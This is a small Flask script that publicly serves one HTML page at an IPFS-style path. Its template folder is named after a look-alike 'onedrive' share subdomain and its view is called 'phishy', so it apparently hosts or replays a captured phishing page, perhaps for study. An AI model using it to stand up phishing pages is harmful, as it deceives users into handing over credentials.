from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='onedriveshargggcjj.infura-ipfs.io/ipfs')

@app.route('/ipfs/QmYZXkZRVFZ3PvLVpKfMnWXBoRpZZFWs9XNqbP9LQZbyiW')
def phishy():
    return render_template('QmYZXkZRVFZ3PvLVpKfMnWXBoRpZZFWs9XNqbP9LQZbyiW.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)